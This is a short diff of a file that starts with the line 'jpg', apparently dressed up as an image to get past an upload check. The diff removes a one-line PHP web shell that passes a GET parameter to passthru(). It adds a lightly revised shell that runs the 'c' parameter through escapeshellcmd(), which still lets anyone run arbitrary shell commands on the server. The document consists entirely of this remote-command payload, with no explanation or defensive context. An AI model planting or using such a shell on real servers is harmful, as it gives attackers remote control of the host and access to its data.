@@ -1,2 +1,3 @@
 jpg
-<?php passthru($_GET['cmd']); ?>
+<?php passthru(escapeshellcmd($_GET['c'] ?? 'echo No hay comando')); ?>
+
